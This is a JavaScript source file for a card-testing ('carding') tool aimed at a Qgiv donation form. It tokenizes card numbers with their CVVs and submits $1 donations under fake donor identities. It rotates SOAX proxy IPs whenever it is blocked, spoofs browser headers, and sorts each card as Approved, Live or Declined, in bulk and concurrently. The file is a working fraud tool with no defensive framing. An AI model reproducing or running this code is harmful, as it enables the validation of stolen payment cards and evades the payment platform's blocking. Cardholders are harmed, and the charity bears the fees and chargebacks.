import got from 'got';
import { CookieJar } from 'tough-cookie';
import { fakeDataService } from '../../utils/FakeDataService.js';
import { HttpsProxyAgent } from 'https-proxy-agent';

/**
 * SOAX Proxy Manager with Smart IP Reuse
 */
class SOAXProxyManager {
    constructor(config) {
        this.host = config.host || 'proxy.soax.com';
        this.port = config.port || 5000;
        this.username = config.username;
        this.password = config.password;
        this.sessionLength = config.sessionLength || 600;
        this.currentSession = null;
    }

    _generateSessionId() {
        return `${Date.now().toString(36)}${Math.random().toString(36).substring(2, 10)}`;
    }

    getProxy() {
        if (!this.currentSession) {
            this._createNewSession();
        }
        return this.currentSession.agent;
    }

    forceRotate() {
        this._createNewSession();
        return this.currentSession.agent;
    }

    _createNewSession() {
        const sessionId = this._generateSessionId();
        const stickyUsername = `${this.username}-sessionid-${sessionId}-sessionlength-${this.sessionLength}`;
        const proxyUrl = `http://${stickyUsername}:${this.password}@${this.host}:${this.port}`;

        this.currentSession = {
            agent: new HttpsProxyAgent(proxyUrl),
            sessionId,
            createdAt: Date.now()
        };
    }

    isEnabled() {
        return !!(this.username && this.password);
    }
}

/**
 * Qgiv Client
 * 
 * Standard Status Codes:
 * - Approved = Card charged successfully
 * - Live = Card confirmed valid (AVS fail, insufficient funds, 3DS)
 * - Declined = Card dead/invalid or generic decline
 * - Errors = Network/proxy errors
 */
export class QgivClient {
    constructor(siteConfig = {}, options = {}) {
        this.site = {
            id: 'qgiv-fidy',
            label: 'Qgiv (Fidya)',
            baseUrl: 'https://secure.qgiv.com',
            formUrl: 'https://secure.qgiv.com/for/fidy/embed',
            tokenizeUrl: 'https://secure.qgiv.com/api/v1/payment/tokenizePayment',
            submitUrl: 'https://secure.qgiv.com/api/v1/submit',
            formId: siteConfig.formId || '1104493',
            ...siteConfig
        };

        this.proxyConfig = options.proxyConfig || null;
        this.soaxManager = this.proxyConfig ? new SOAXProxyManager(this.proxyConfig) : null;
        this.maxRetries = options.maxRetries ?? 3;
        this.timeout = options.timeout ?? 30000;
        this.debug = options.debug ?? false;
    }

    // =========================================================================
    // RESPONSE CLASSIFICATION
    // =========================================================================

    /**
     * CONFIRMED LIVE patterns - card definitely exists
     * Only specific messages that confirm card validity
     */
    static LIVE_PATTERNS = [
        { pattern: 'address verification failed', code: 'avs_failed' },
        { pattern: 'insufficient funds', code: 'insufficient_funds' },
        { pattern: 'insufficient balance', code: 'insufficient_funds' },
        { pattern: '3d secure', code: '3ds_required' },
        { pattern: 'authentication required', code: '3ds_required' },
    ];

    _classifyResponse(errorMsg) {
        if (!errorMsg) return { status: 'Declined', code: 'unknown' };

        const lower = errorMsg.toLowerCase();

        // Check for CONFIRMED LIVE patterns (specific messages only)
        for (const item of QgivClient.LIVE_PATTERNS) {
            if (lower.includes(item.pattern)) {
                return { status: 'Live', code: item.code };
            }
        }

        // Everything else is Declined
        return { status: 'Declined', code: 'generic_decline' };
    }

    _extractTransactionId(msg) {
        const match = msg?.match(/Transaction ID[:\s]*(\d+)/i);
        return match ? match[1] : null;
    }

    _log(step, message) {
        if (this.debug) {
            console.log(`[${new Date().toISOString().slice(11, 23)}][${step}] ${message}`);
        }
    }

    generateFakeUser() {
        return fakeDataService.generateFakeUser();
    }

    // =========================================================================
    // SESSION
    // =========================================================================
    createSession(proxyAgent = null) {
        const cookieJar = new CookieJar();

        return got.extend({
            timeout: { request: this.timeout },
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
            },
            followRedirect: true,
            maxRedirects: 5,
            cookieJar,
            throwHttpErrors: false,
            ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
        });
    }

    // =========================================================================
    // API METHODS
    // =========================================================================
    async loadFormPage(session) {
        try {
            const response = await session(this.site.formUrl, {
                headers: { 'Referer': this.site.baseUrl }
            });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true };
            }
            if (response.statusCode !== 200) {
                return { success: false, error: `HTTP_${response.statusCode}` };
            }

            const csrfMatch = response.body.match(/name=["']csrfToken["'][^>]*value=["']([^"']+)["']/i)
                || response.body.match(/value=["']([^"']+)["'][^>]*name=["']csrfToken["']/i);

            return { success: true, csrfToken: csrfMatch?.[1] || null };
        } catch (error) {
            return { success: false, error: error.code || error.message };
        }
    }

    async tokenizeCard(session, cardData, csrfToken) {
        const url = `${this.site.tokenizeUrl}?csrfToken=${csrfToken}`;
        const expMonth = String(cardData.expMonth).padStart(2, '0');
        const expYear = String(cardData.expYear).length === 2 ? `20${cardData.expYear}` : String(cardData.expYear);

        const formData = new URLSearchParams({
            'Billing_Name': '',
            'Card_CVV': cardData.cvc || cardData.cvv,
            'Card_Exp_Date': `${expMonth}/${expYear}`,
            'Card_Number': cardData.number
        });

        try {
            const response = await session.post(url, {
                body: formData.toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json',
                    'Origin': 'https://secure.qgiv.com',
                    'Referer': this.site.formUrl,
                }
            });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true };
            }

            let data;
            try { data = JSON.parse(response.body); }
            catch { return { success: false, error: 'INVALID_RESPONSE' }; }

            if (data.success && data.token) {
                return { success: true, token: data.token };
            }

            return { success: false, error: data.message || 'Tokenization failed' };
        } catch (error) {
            return { success: false, error: error.code || error.message };
        }
    }

    async submitDonation(session, params) {
        const { csrfToken, token, fakeUser, billingZip } = params;
        const url = `${this.site.submitUrl}?csrfToken=${csrfToken}`;
        const zipCode = billingZip || fakeUser.postalCode || '10001';

        const formData = new URLSearchParams({
            'form': this.site.formId,
            'productType': '1',
            'submissionType': '1',
            'Is_Multi_Restriction': 'false',
            'Express_Checkout': 'false',
            'Donations[0][Selected_One_Time_Id]': '1673646',
            'Donations[0][Other_One_Time_Amount]': '1',
            'Donations[0][Recurring_Frequency]': 'n',
            'Personal[First_Name]': fakeUser.firstName,
            'Personal[Last_Name]': fakeUser.lastName,
            'Personal[Email]': fakeUser.email,
            'Personal[Address]': '',
            'Personal[Address_2]': '',
            'Personal[City]': '',
            'Personal[State]': '',
            'Personal[Zip]': zipCode,
            'Personal[Country]': 'US',
            'Payment[Payment_Type]': '1',
            'Payment[Card_Token]': token,
            'Billing[Billing_Address]': '',
            'Billing[Billing_Address_2]': '',
            'Billing[Billing_City]': '',
            'Billing[Billing_State]': '',
            'Billing[Billing_Zip]': zipCode,
            'Billing[Billing_Country]': 'US',
            'Billing[Billing_Address_Use_Mailing]': 'false',
            'Privacy[Anonymity]': 'false',
            'AbandonedGift[qgiv_abandoned_gift]': `abandonedGiftDetails_${this._generateHash()}`,
            'AbandonedGift[source]': '0',
            'onePayValidationNonce': ''
        });

        try {
            const response = await session.post(url, {
                body: formData.toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json',
                    'Origin': 'https://secure.qgiv.com',
                    'Referer': this.site.formUrl,
                    'X-Requested-With': 'XMLHttpRequest',
                }
            });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true };
            }

            let data;
            try { data = JSON.parse(response.body); }
            catch { return { success: false, error: 'INVALID_RESPONSE' }; }

            // Success - Approved
            const isSuccess = data.success === true || (data.success && data.success.transaction);

            if (isSuccess) {
                const txId = data.donation_id || data.success?.transaction?.id;

                if (data.requires_action) {
                    return { status: 'Live', code: '3ds_required', transactionId: txId };
                }
                return { status: 'Approved', transactionId: txId };
            }

            // Error response - classify it
            if (data.errors && data.errors.length > 0) {
                const errorMsg = data.errors[0];
                const classification = this._classifyResponse(errorMsg);
                const txId = this._extractTransactionId(errorMsg);

                return {
                    status: classification.status,
                    code: classification.code,
                    message: errorMsg,
                    transactionId: txId
                };
            }

            return { status: 'Declined', code: 'unknown' };
        } catch (error) {
            return { success: false, error: error.code || error.message };
        }
    }

    // =========================================================================
    // MAIN VALIDATION
    // =========================================================================
    async validate(cardData) {
        const cardNum = cardData.number;
        const cardPreview = `${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`;

        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            const proxyAgent = this.soaxManager?.isEnabled() ? this.soaxManager.getProxy() : null;
            const session = this.createSession(proxyAgent);
            const fakeUser = this.generateFakeUser();

            // Step 1: Load form
            const formResult = await this.loadFormPage(session);
            if (!formResult.success) {
                if (formResult.isBlocked) {
                    this._log('VALIDATE', `Blocked at form, rotating IP (${attempt}/${this.maxRetries})`);
                    this.soaxManager?.forceRotate();
                    continue;
                }
                if (attempt < this.maxRetries) continue;
                return { status: 'Errors', message: formResult.error || 'Network error', card: cardPreview };
            }

            if (!formResult.csrfToken) {
                return { status: 'Errors', message: 'NO_CSRF', card: cardPreview };
            }

            // Step 2: Tokenize
            const tokenResult = await this.tokenizeCard(session, cardData, formResult.csrfToken);
            if (!tokenResult.success) {
                if (tokenResult.isBlocked) {
                    this._log('VALIDATE', `Blocked at tokenize, rotating IP (${attempt}/${this.maxRetries})`);
                    this.soaxManager?.forceRotate();
                    continue;
                }
                const classification = this._classifyResponse(tokenResult.error);
                return {
                    status: classification.status,
                    code: classification.code,
                    message: tokenResult.error,
                    card: cardPreview
                };
            }

            // Step 3: Submit
            const submitResult = await this.submitDonation(session, {
                csrfToken: formResult.csrfToken,
                token: tokenResult.token,
                fakeUser,
                billingZip: cardData.zip || cardData.billingZip
            });

            if (submitResult.success === false) {
                if (submitResult.isBlocked) {
                    this._log('VALIDATE', `Blocked at submit, rotating IP (${attempt}/${this.maxRetries})`);
                    this.soaxManager?.forceRotate();
                    continue;
                }
                if (attempt < this.maxRetries) continue;
                return { status: 'Errors', message: submitResult.error || 'Network error', card: cardPreview };
            }

            // Got a result!
            return {
                status: submitResult.status,
                code: submitResult.code,
                message: submitResult.message,
                transactionId: submitResult.transactionId,
                card: cardPreview,
                attempts: attempt
            };
        }

        // All retries exhausted due to blocks
        return { status: 'Errors', message: 'Proxy blocked - change proxy', card: cardPreview };
    }

    // =========================================================================
    // MASS VALIDATION
    // =========================================================================
    async validateMany(cards, options = {}) {
        const concurrency = options.concurrency ?? 3;
        const onResult = options.onResult;
        const results = new Array(cards.length);

        let running = 0;
        let nextIdx = 0;

        return new Promise((resolve) => {
            const processNext = async () => {
                if (nextIdx >= cards.length) {
                    if (running === 0) resolve(results);
                    return;
                }

                const idx = nextIdx++;
                const card = cards[idx];
                running++;

                const start = Date.now();
                const result = await this.validate(card);
                result.duration = Date.now() - start;
                result.index = idx;

                results[idx] = result;
                onResult?.(result, idx, cards.length);

                running--;
                processNext();
            };

            for (let i = 0; i < Math.min(concurrency, cards.length); i++) {
                processNext();
            }
            if (cards.length === 0) resolve([]);
        });
    }

    _generateHash() {
        return [...Array(40)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    }
}

export default QgivClient;
